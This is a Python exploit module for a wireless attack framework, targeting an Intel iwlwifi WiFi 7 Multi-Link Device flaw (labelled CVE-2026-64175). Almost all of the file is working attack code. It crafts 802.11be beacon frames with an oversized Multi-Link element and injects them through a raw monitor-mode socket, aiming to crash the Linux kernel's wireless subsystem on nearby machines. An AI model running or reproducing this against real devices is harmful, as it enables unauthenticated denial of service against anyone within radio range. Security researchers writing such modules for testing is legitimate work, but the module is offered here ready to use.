# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Intel iwlwifi WiFi 7 Multi-Link Device DoS (CVE-2026-64175).

    The iwlwifi driver in the Linux kernel mishandles Multi-Link Device
    (MLD) operations introduced in WiFi 7 (802.11be).  When processing
    Multi-Link element IEs in beacon or probe response frames, the driver
    fails to validate the link count and link ID fields.  Sending a
    management frame with a crafted Multi-Link element that declares more
    links than the device supports triggers a null pointer dereference or
    array out-of-bounds access in the MLD setup path, crashing the
    wireless subsystem.

    CVSS v3.1: ~6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Intel iwlwifi WiFi 7 MLD DoS (CVE-2026-64175)",
        "description": (
            "Exploits CVE-2026-64175 via crafted Multi-Link element IEs "
            "in 802.11be management frames.  The iwlwifi driver does not "
            "validate MLD link count and link ID fields, causing null "
            "pointer dereference or OOB access in the MLD setup path "
            "when the frame declares more links than supported."
        ),
        "authors": (
            "Intel WiFi security team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-64175",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2026-06-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernels with iwlwifi WiFi 7 / 802.11be support",
            "Intel BE200, BE202 chipsets",
            "Ubuntu 24.04+, Fedora 40+ (unpatched)",
        ),
    }

    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    fake_link_count = OptInteger(16, "Fake MLD link count (exceeds HW max)")
    injection_rounds = OptInteger(32, "Number of beacon injection rounds")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_BEACON = 0x08
    _SUBTYPE_PROBE_RESP = 0x05
    _SUBTYPE_PROBE_REQ = 0x04

    _IE_EXTENSION = 255
    _EXT_MULTI_LINK = 107

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_multi_link_ie(self, link_count: int) -> bytes:
        """Build a crafted Multi-Link element with excessive link count.

        The ML element contains a Common Info field followed by per-link
        subelements.  We declare more links than the hardware supports,
        triggering the OOB access when the driver iterates.
        """
        ext_id = struct.pack("B", self._EXT_MULTI_LINK)

        ml_control = struct.pack("<H", 0x0001)
        common_info_len = struct.pack("B", 13)
        mld_addr = self._FAKE_BSSID
        link_id_info = struct.pack("B", 0)
        bss_change_count = struct.pack("B", 1)
        eml_cap = struct.pack("<H", 0x0000)
        mld_cap = struct.pack("<H", 0x0000)
        common_info = common_info_len + mld_addr + link_id_info + bss_change_count + eml_cap + mld_cap

        per_link_data = b""
        for link_id in range(link_count):
            subelement_id = struct.pack("B", 0)
            link_info = struct.pack("B", link_id & 0xFF) + b"\x00" * 8
            subelement_len = struct.pack("B", len(link_info))
            per_link_data += subelement_id + subelement_len + link_info

        ie_data = ext_id + ml_control + common_info + per_link_data
        ie_header = struct.pack("BB", self._IE_EXTENSION, len(ie_data))
        return ie_header + ie_data

    def _build_mld_beacon(self, seq: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_BEACON)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + src + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ssid_ie = struct.pack("BB", 0, 7) + b"mld-fuz"
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x82, 0x84, 0x8B, 0x96])
        ml_ie = self._build_multi_link_ie(self.fake_link_count)

        body = fixed + ssid_ie + rates_ie + ml_ie
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        header = fc + duration + self._BROADCAST + self._FAKE_BSSID + self._BROADCAST + struct.pack("<H", 0)
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting MLD beacons")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        print_status(
            f"Injecting {self.injection_rounds} beacons with "
            f"{self.fake_link_count}-link Multi-Link element"
        )

        success = 0
        for rnd in range(self.injection_rounds):
            beacon = self._build_mld_beacon(rnd)
            if self._inject_frame(raw, beacon):
                success += 1
            time.sleep(0.01)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} MLD beacons")
        print_info(
            "The crafted Multi-Link element declares more links than "
            "supported.  If the target runs iwlwifi with WiFi 7 / "
            "802.11be support, the MLD setup path will access beyond "
            "the link array bounds, causing a kernel crash."
        )
